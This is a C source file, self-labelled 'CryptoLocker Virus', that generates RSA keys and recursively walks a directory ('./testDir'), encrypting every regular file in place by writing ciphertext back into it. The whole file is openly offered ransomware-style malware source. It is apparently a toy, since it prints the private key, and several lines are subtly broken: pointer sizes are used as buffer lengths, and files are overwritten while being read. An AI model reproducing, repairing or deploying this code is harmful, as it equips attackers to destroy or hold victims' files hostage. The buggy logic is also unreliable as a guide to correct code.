#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
#include "rsa.h"
#define MAX 1000
///*CryptoLocker Virus*///

void diveAndEncrypt();

int main(int argc, char **argv){
  printf("___xXxCrytoLockerxXx_by DT___\n");
  printf("_____________________________\n");
  struct key_class public[1];
  struct key_class private[1];
  rsa_gen_keys( public, private,PRIME_SOURCE_FILE);
  printKeys(public, private);
  printf("______________________\n");
  printf("LVL | [folder name] | File\n");
  diveAndEncrypt("./testDir",0,public);

}
// Recursive to dive and Encrypt all Txt docs 
void diveAndEncrypt(const char *name, int level, const struct key_class *key){
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(name)))
        return;
    if (!(entry = readdir(dir)))
        return;
    
    do {
        if (entry->d_type == DT_DIR) {
            char path[1024];
            int len = snprintf(path, sizeof(path)-1, "%s/%s", name, entry->d_name);
            path[len] = 0;
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            printf("%*s[%s]\n", level*2, "", entry->d_name);
            diveAndEncrypt(path, level + 1, key);
        }
        if (entry->d_type== DT_REG){
            printf("%d- %s\n", level, entry->d_name);
	    char *buffer = malloc(sizeof(char) * MAX);
	    char fileName[1024];
            int len = snprintf(fileName, sizeof(fileName)-1, "%s/%s", name, entry->d_name);
            fileName[len] = 0;
	    FILE *fp = fopen(fileName, "r+");
	    while (fgets(buffer, MAX, fp) != NULL) {
	    long long *encryptedData= rsa_encrypt(buffer,sizeof(buffer), key);
	    for(int i =0; i<sizeof(encryptedData);i++){
	          fprintf(fp, "%llu ", encryptedData[i]);

	    }
	    }
    free(buffer);
    fclose(fp);
	}else
	  printf("%d- %s term\n", level, entry->d_name);
	  }while (entry = readdir(dir));
    closedir(dir);
}


